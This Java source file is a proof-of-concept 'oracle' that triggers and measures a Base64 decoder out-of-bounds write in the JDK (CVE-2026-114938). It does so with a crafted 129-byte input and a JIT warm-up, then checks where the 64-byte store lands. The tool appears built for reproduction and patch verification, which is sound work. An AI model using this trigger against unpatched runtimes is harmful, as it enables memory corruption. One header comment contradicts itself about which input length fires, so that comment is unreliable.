import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Locale;

/**
 * j4s-oracle - oraculo de corrupcao para CVE-2026-114938.
 *
 * Autor do harness: eduxcode (github.com/eduxcode)
 * Primitiva do gatilho: Quang Luong / Calif.io (advisory publico CVE-2026-114938)
 *
 * O que este oraculo acrescenta:
 *
 *   1. deriva o comprimento de gatilho que realmente alcanca o stub AVX-512:
 *      o gate do stub e `length > 128`, e a cauda precisa ter 1..3 bytes
 *      (length % 64 em {1,2,3}). Por isso 64+'=' e 128+'=' NAO disparam:
 *      ficam no loop escalar. O gatilho correto e 128+'=' (129 bytes).
 *   2. calcula a janela exata da store: dp = 48 * (length / 64), 64 bytes.
 *   3. calcula o buffer que a JDK aloca: 3*ceil((n+1)/4) - paddings.
 *   4. valida primeiro/ultimo byte e a contagem, em vez de "mudou algo".
 *
 * Usa decode(byte[],byte[]) com destino de 8192 bytes: a store acontece no
 * mesmo offset, mas dentro do array, o que permite medir sem crashar a JVM.
 *
 * Um gatilho por JVM: a primeira IllegalArgumentException faz o C2
 * desotimizar decode0; chamadas seguintes caem no loop escalar.
 */
public final class Oracle {

    static final String TOOL = "j4s-oracle";
    static final String VER = "2.0";
    static final String AUTHOR = "eduxcode";
    static final String GITHUB = "github.com/eduxcode";
    static final String UPSTREAM = "CVE-2026-114938 - Quang Luong / Calif.io";

    static final byte FILL = (byte) 0x5a;
    static final int TARGET_SIZE = 8192;
    static volatile long sink;

    static final class Result {
        int chars, inLen, bufferLen, writeStart, writeEnd, changed, first, last, oob;
        boolean rejected, hit, tailExpected;
        String note = "";
    }

    public static void main(String[] args) {
        int[] lengths = {128};   // 128 'A' + '=' = 129 bytes (length > 128, tail 1)
        int warmup = 200_000;
        boolean json = false;

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--json" -> json = true;
                case "--warmup" -> warmup = Integer.parseInt(args[++i]);
                case "--lengths" -> {
                    String[] p = args[++i].split(",");
                    lengths = new int[p.length];
                    for (int k = 0; k < p.length; k++) lengths[k] = Integer.parseInt(p[k].trim());
                }
                case "-h", "--help" -> { usage(); return; }
                default -> { System.err.println("arg desconhecido: " + args[i]); usage(); System.exit(2); }
            }
        }

        String rt = System.getProperty("java.runtime.version");
        boolean sde = System.getenv("J4S_SDE") != null;

        if (!json) {
            System.out.println("=".repeat(70));
            System.out.printf("  %s v%s  -  oraculo de corrupcao Base64%n", TOOL, VER);
            System.out.printf("  harness: %s (%s)%n", AUTHOR, GITHUB);
            System.out.printf("  primitiva: %s%n", UPSTREAM);
            System.out.println("=".repeat(70));
            System.out.printf("  runtime : %s%n", rt);
            System.out.printf("  arch    : %s%n", System.getProperty("os.arch"));
            System.out.println(sde
                    ? "  cpu     : AVX-512 VBMI emulado (Intel SDE) -> caminho vetorizado ativo"
                    : "  cpu     : tentativa direta no caminho AVX-512 (gate: length > 128)");
            System.out.println("-".repeat(70));
            System.out.printf("  aquecendo %d decodes de 192 bytes (compila o intrinsic)...%n", warmup);
            if (lengths.length > 1) {
                System.out.println("  AVISO: so o primeiro gatilho por JVM atinge o stub;");
                System.out.println("         use um processo por comprimento para medir varios.");
            }
        }

        Base64.Decoder dec = Base64.getDecoder();
        warm(dec, warmup);

        List<Result> results = new ArrayList<>();
        for (int n : lengths) results.add(attempt(dec, n));

        boolean anyHit = results.stream().anyMatch(r -> r.hit);

        if (!json) {
            for (Result r : results) {
                String win = r.first < 0 ? "nenhuma"
                        : "[" + r.first + "," + r.last + "]";
                System.out.printf(Locale.ROOT,
                        "  [%s] %dx'A'+'='  len=%d  buffer=%d  rejeitado=%s%n",
                        r.hit ? "HIT" : "---", r.chars, r.inLen, r.bufferLen, r.rejected);
                System.out.printf(Locale.ROOT,
                        "        observado=%s  cauda=[%d,%d]  alterados=%d  OOB=%d%n",
                        win, r.writeStart, r.writeEnd, r.changed, r.oob);
            }
            System.out.println("-".repeat(70));
            if (anyHit) {
                System.out.printf("  VEREDITO: CORRUPCAO REPRODUZIDA (%d bytes alem do array)%n",
                        results.stream().filter(r -> r.hit).findFirst().get().oob);
                System.out.println("            store de 64 bytes em dp, buffer alocado pela JDK");
            } else {
                System.out.println("  VEREDITO: sem corrupcao com os gatilhos testados");
                System.out.println("            causas: length <= 128 (loop escalar), host sem");
                System.out.println("            AVX-512 VBMI, runtime corrigido, ou JIT nao compilou.");
            }
            System.out.println("=".repeat(70));
        } else {
            System.out.println(toJson(rt, results, anyHit));
        }

        System.exit(anyHit ? 0 : 3);
    }

    /** Roda um gatilho e mede exatamente onde a store caiu. */
    static Result attempt(Base64.Decoder dec, int chars) {
        Result r = new Result();
        r.chars = chars;
        r.inLen = chars + 1;                                   // + '='

        int len = r.inLen;
        int paddings = 0;
        if (len >= 2) { /* gatilho termina em um unico '=' */ paddings = 1; }
        if (paddings == 0 && (len & 3) != 0) paddings = 4 - (len & 3);
        r.bufferLen = 3 * ((len + 3) / 4) - paddings;

        r.writeStart = 48 * (len / 64);                        // dp apos os blocos de 64
        r.writeEnd = r.writeStart + 63;
        r.tailExpected = len > 128 && (len & 63) >= 1 && (len & 63) <= 3;
        r.oob = r.writeEnd - (r.bufferLen - 1);

        byte[] target = new byte[TARGET_SIZE];
        Arrays.fill(target, FILL);

        try {
            dec.decode(("A".repeat(chars) + "=").getBytes(StandardCharsets.US_ASCII), target);
        } catch (IllegalArgumentException expected) {
            r.rejected = true;                                 // a JDK rejeita DEPOIS de escrever
        }

        int changed = 0, first = -1, last = -1;
        for (int i = 0; i < target.length; i++) {
            if (target[i] != FILL) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }
        r.changed = changed; r.first = first; r.last = last;

        r.hit = r.rejected && r.tailExpected
                && changed == r.writeEnd + 1
                && first == 0 && last == r.writeEnd
                && r.oob == 62;
        return r;
    }

    /** length > 128 para o stub escolher AVX-512 (o gate e `cmpl(length,128)`). */
    static void warm(Base64.Decoder dec, int iters) {
        byte[] valid = "A".repeat(192).getBytes(StandardCharsets.US_ASCII);
        byte[] out = new byte[TARGET_SIZE];
        long acc = 0;
        for (int i = 0; i < iters; i++) acc += dec.decode(valid, out);
        sink = acc;
    }

    static String toJson(String rt, List<Result> results, boolean anyHit) {
        StringBuilder b = new StringBuilder();
        b.append("{\"tool\":\"").append(TOOL).append("\"")
         .append(",\"version\":\"").append(VER).append("\"")
         .append(",\"author\":\"").append(AUTHOR).append("\"")
         .append(",\"upstream\":\"").append(UPSTREAM).append("\"")
         .append(",\"runtime\":\"").append(rt).append("\"")
         .append(",\"results\":[");
        for (int i = 0; i < results.size(); i++) {
            Result r = results.get(i);
            if (i > 0) b.append(',');
            b.append("{\"trigger\":").append(r.chars)
             .append(",\"in_len\":").append(r.inLen)
             .append(",\"buffer_len\":").append(r.bufferLen)
             .append(",\"write_start\":").append(r.writeStart)
             .append(",\"write_end\":").append(r.writeEnd)
             .append(",\"rejected\":").append(r.rejected)
             .append(",\"changed\":").append(r.changed)
             .append(",\"first\":").append(r.first)
             .append(",\"last\":").append(r.last)
             .append(",\"oob\":").append(r.oob)
             .append(",\"hit\":").append(r.hit).append('}');
        }
        b.append("],\"verdict\":\"").append(anyHit ? "CORRUPTED" : "NO_WRITE")
         .append("\"}");
        return b.toString();
    }

    static void usage() {
        System.out.println("""
            uso: java Oracle [--lengths 129] [--warmup N] [--json]

              --lengths  quantidade de 'A' antes do '=' (default 128 -> 129 bytes)
              --warmup   iteracoes de aquecimento (default 200000)
              --json     saida legivel por maquina

            um gatilho por JVM. saida: 0 = corrupcao | 3 = nao reproduzida | 2 = erro
            """);
    }
}
